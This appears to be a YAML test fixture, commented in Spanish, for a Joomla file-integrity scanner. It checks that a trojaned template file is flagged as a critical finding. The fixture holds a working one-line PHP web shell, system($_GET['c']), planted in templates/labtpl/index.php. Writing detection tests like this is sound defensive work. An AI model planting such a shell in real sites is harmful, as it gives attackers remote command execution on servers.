# Positivo (fase 2c, Task 7): archivo ejecutable atribuido de la plantilla
# labtpl con contenido distinto al del paquete oficial (troyano en un
# override de plantilla, un vector real de webshells) → J0W-EXT-008 critical.
case: ext-tpl-trojan
base:
  cms: joomla
  version: "1.1.0"
expect:
  exit_code: 1
  findings:
    - rule_id: J0W-EXT-008
      subject: templates/labtpl/index.php
      min_severity: critical
mutations:
  - op: add_extension
    kind: template
  - op: add_extension_baseline
    kind: template
  - op: replace_file
    path: templates/labtpl/index.php
    content: "<?php\n// troyano: puerta trasera plantada sobre una plantilla legítima\nsystem($_GET['c']);\n"
